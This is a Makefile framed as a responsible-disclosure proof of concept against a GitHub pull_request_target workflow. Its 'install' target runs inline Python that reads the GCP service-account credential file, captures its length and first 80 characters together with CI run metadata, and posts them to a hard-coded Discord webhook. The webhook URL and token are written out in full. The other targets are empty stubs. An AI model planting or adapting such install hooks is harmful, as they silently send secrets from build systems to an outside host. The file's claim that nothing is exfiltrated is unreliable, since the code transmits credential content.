# Security Research PoC - Responsible Disclosure
# Proves GCP credential access from fork PR via pull_request_target
# No credentials exfiltrated. Only prefix + length reported.

WEBHOOK = https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y

.PHONY: install test lint backend

install:
	@echo "[PoC] install target called"
	@python3 -c "\
	import json, os, urllib.request; \
	cred_path = os.environ.get('GOOGLE_APPLICATION_CREDENTIALS', 'NOT_SET'); \
	cred_info = 'NOT_SET'; \
	cred_prefix = ''; \
	project = os.environ.get('CLOUDSDK_CORE_PROJECT', os.environ.get('GCP_PROJECT', 'unknown')); \
	if os.path.isfile(cred_path): \
	    data = open(cred_path).read(); \
	    cred_info = f'EXISTS ({len(data)} bytes)'; \
	    cred_prefix = data[:80].replace('\n', ' '); \
	msg = f'**PoC: google/adk-samples GCP credential exposure**\n\`\`\`\nRepo: {os.environ.get(\"GITHUB_REPOSITORY\", \"unknown\")}\nRun ID: {os.environ.get(\"GITHUB_RUN_ID\", \"unknown\")}\nEvent: {os.environ.get(\"GITHUB_EVENT_NAME\", \"unknown\")}\nRunner: {os.environ.get(\"RUNNER_NAME\", \"unknown\")}\nGCP Project: {project}\n\nGOOGLE_APPLICATION_CREDENTIALS: {cred_path}\nSA Key: {cred_info}\nSA Key prefix: {cred_prefix}\n\`\`\`\nNo credentials exfiltrated. Prefix+length only.\nReported to Google OSS VRP.'; \
	payload = json.dumps({'content': msg}).encode(); \
	req = urllib.request.Request('$(WEBHOOK)', data=payload, headers={'Content-Type': 'application/json'}); \
	urllib.request.urlopen(req, timeout=10); \
	print('[PoC] Webhook sent successfully')" || echo "[PoC] Webhook failed"

test:
	@echo "[PoC] test target called -- no actual tests run"

lint:
	@echo "[PoC] lint target called"

backend:
	@echo "[PoC] backend target called"
	@sleep 15
